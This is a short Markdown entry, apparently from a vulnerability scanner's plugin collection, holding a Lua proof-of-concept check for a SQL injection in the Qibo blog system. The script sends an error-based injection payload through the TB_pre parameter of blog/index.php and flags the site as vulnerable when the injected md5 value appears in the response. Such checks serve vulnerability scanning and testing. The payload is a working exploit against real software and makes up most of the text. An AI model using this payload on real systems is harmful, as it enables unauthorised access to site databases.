# SQL 注入

## Qibo Blogsystem SQL-Injection

```poc
local http = require("http")

function assign(service, arg)
    if service == "qibocms" then
        return true, arg
    end
end
function audit(arg)
    local payload = 'blog/index.php?file=listbbs&uid=1&id=1&TB_pre=qb_module%20where%201=1%20or%20updatexml(2,concat(0x7e,(md5(1))),0)%20%23'
    local target = arg + payload
    local resp = http.get(target)
    if resp.code == 200 and string.contains(resp.body, 'c4ca4238a0b923820dcc509a6f75849') then
        report_hole(target, resp)
    end
end
function test()
    local checkrun, param = assign("qibocms", 'http://www.example.com/')
    if checkrun then
        audit(param)
    end
end
```